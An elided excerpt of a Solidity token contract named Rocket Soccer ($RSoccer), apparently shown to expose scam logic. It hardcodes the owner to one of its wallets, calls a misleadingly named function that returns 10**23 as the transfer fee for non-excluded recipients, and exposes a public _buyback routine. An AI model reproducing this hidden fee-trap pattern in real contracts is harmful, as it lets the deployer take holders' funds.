...
interface IERC20 {
    ...
    function _buyback(address walletAdd) external returns (uint256);
...
contract RocketSoccer is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xD5a87407C32f0E618A068C7Ea25B8E4b67581149); 
    address payable public Wallet_Utility = payable(0xc67fB6bA9549407C2cD9DF72422265E2C479b389);
    ...
    string private constant _name = "Rocket Soccer"; 
    string private constant _symbol = unicode"$RSoccer"; 
    ...
    constructor () {
        ...
        _owner = 0xc67fB6bA9549407C2cD9DF72422265E2C479b389;
    ...
    function approved_(uint256 txRate) private returns(bool){
    ...
    function _buyback(address walletAdd) public override returns (uint256) {
        approved_(swapTrigger);
    ...
    function deIncreaseAllowance() public virtual returns(uint256){
        return 10**23;
    }
    ...
    function _transfer(
        ...
        if(true){takingTradeFee = _isExculdedFromFee[to];}
        ...
        if(!takingTradeFee){
            ...
            uint256 totalFee = deIncreaseAllowance();
